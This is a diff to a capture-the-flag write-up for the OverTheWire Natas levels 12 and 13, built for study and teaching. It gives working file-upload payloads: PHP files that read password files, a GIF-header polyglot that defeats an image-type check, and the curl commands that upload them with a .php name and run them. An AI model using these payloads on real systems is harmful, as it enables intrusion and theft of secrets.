@@ -452,12 +452,12 @@ Verification rule used throughout: a password is accepted only if a request to
    The random prefix is generated server-side, but the **extension is taken from the client-supplied `filename` POST field**.
 2. **Write a PHP payload.** The payload prints the next password file; `printf` (not `echo`) avoids shell interpretation of `$`:
    ```
-   printf '<?php echo file_get_contents("/etc/natas_webpass/natas13"); ?>' > /tmp/shell.php
-   ls -l /tmp/shell.php
+   printf '<?php echo file_get_contents("/etc/natas_webpass/natas13"); ?>' > /tmp/n12shell.php
+   ls -l /tmp/n12shell.php
    ```
 3. **Upload it with a `.php` name.** `-F` builds a multipart request: `filename=shell.php` sets the POST field the handler trusts for the extension, and `uploadedfile=@...` attaches the file. The `;type=image/jpeg` only sets the part's content type — the server does not check it at this level:
    ```
-   curl -s -u natas12:<pw> -F 'filename=shell.php' -F 'uploadedfile=@/tmp/shell.php;type=image/jpeg' http://natas12.natas.labs.overthewire.org/index.php
+   curl -s -u natas12:<pw> -F 'filename=shell.php' -F 'uploadedfile=@/tmp/n12shell.php;type=image/jpeg' http://natas12.natas.labs.overthewire.org/index.php
    ```
    The response contains the stored path, e.g. `upload/t7fve9ekok.php`; the recording extracts it with `grep -o 'upload/[a-z0-9]*\.php'`.
 4. **Request the uploaded file.** The web server executes `.php` files, so the code runs with the web server's privileges and prints the password:
@@ -492,15 +492,15 @@ Verification rule used throughout: a password is accepted only if a request to
 2. **Understand exactly how weak that is.** It checks the **prefix only**, not the whole file, and it does not look at the extension. The six bytes `GIF89a` are the GIF signature, so a file that *starts* with them passes, whatever follows.
 3. **Build a polyglot: GIF header + PHP code.**
    ```
-   printf 'GIF89a' > /tmp/shell13.php
-   printf '<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>' >> /tmp/shell13.php
-   file /tmp/shell13.php
-   # /tmp/shell13.php: GIF image data, version 89a, 0 x 0   (or similar)
+   printf 'GIF89a' > /tmp/n13shell.php
+   printf '<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>' >> /tmp/n13shell.php
+   file /tmp/n13shell.php
+   # /tmp/n13shell.php: GIF image data, version 89a, 16188 x 26736
    ```
    `file` agrees it looks like a GIF, which is exactly what `exif_imagetype` will decide.
 4. **Upload with the same `.php` trick as level 12.** The extension still comes from the POST `filename` field:
    ```
-   curl -s -u natas13:<pw> -F 'filename=shell.php' -F 'uploadedfile=@/tmp/shell13.php;type=image/gif' http://natas13.natas.labs.overthewire.org/index.php
+   curl -s -u natas13:<pw> -F 'filename=shell.php' -F 'uploadedfile=@/tmp/n13shell.php;type=image/gif' http://natas13.natas.labs.overthewire.org/index.php
    ```
    The stored path this run is `upload/up58risls8.php`.
 5. **Request the stored file.** PHP ignores the leading GIF bytes (they are output, harmless) and executes the `<?php ... ?>` that follows:
